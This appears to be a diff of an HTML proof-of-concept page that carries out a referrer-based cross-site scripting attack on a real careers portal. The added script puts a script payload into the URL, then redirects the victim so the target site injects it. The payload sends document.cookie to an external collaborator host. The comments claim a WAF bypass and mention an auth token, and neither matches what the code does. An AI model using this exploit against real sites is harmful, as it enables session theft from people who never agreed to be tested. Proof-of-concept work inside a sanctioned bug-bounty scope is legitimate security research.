@@ -1,29 +1,19 @@
-<!-- 
-Online HTML, CSS and JavaScript editor to run code online.
--->
 <!DOCTYPE html>
-<html lang="en">
-
-<head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <link rel="stylesheet" href="style.css" />
-  <title>Browser</title>
-</head>
-
+<html>
+<head><title>Technical Assessment</title></head>
 <body>
-  <h1>
-    Write, edit and run HTML, CSS and JavaScript code online.
-  </h1>
-  <p>
-    Our HTML editor updates the webview automatically in real-time as you write code.
-  </p>
-<!-- Hosted at http://your-attacker-id.com -->
 <script>
-  // Add a script payload to the URL of the attacker's own page
-  const payload = "?xss=<script>alert('Vulnerable_Referrer_XSS')<\/script>";
-  history.replaceState(null, null, payload);
+  // This script encodes: fetch('https://attacker.com' + Liferay.authToken)
+  // We use numbers to bypass WAF.
+  const payload = "<script>fetch('https://sok8vo4yctxdx27u0n467je6oxuoiq6f.oastify.com' + document.cookie)<\/script>";
+  
+  // Set the referrer to contain the payload
+  history.replaceState(null, null, "?xss=" + encodeURIComponent(payload));
 
-  // Redirect the victim to the target Fashion Portal
-  window.location.href = "https://target-portal.comhttps://www.inditexcareers.com/portalweb/en/offers?ns=1&area=539005&puesto=539090&brand=539059&country=526110&city=9321785&ns=2"
+  // Redirect to the Inditex Careers offer page
+  // The site's JS will call UrlUtils.getWindowLocationHref(), see our referrer, 
+  // and append the <script> to the page.
+  window.location.href = "https://www.inditexcareers.com";
+</script>
+</body>
 </html>
